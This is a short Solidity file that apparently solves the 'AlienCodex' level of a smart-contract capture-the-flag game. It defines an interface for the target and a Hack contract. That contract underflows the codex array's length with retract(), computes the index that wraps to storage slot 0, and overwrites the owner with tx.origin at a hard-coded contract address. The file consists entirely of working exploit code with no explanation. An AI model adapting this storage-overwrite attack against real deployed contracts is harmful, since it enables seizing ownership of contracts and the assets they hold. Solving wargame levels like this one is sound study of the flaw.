// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface IAlienCodex {
    function contact() external view returns (bool);

    function codex(uint256) external view returns (bytes32);

    function make_contact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;

    function renounceOwnership() external;

    function transferOwnership(address newOwner) external;

    function owner() external view returns (address);

    function isOwner() external view returns (bool);
}

contract Hack {
    IAlienCodex private target =
        IAlienCodex(0x1b9c9894991561bBDC7a1b857974f842b8D5d92D);

    function attack() external {
        uint256 index = ((2**256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        target.make_contact();
        target.retract();
        target.revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}

// 0x60F5A4963e414Edb58Ea1d2271c438b49dAA8827
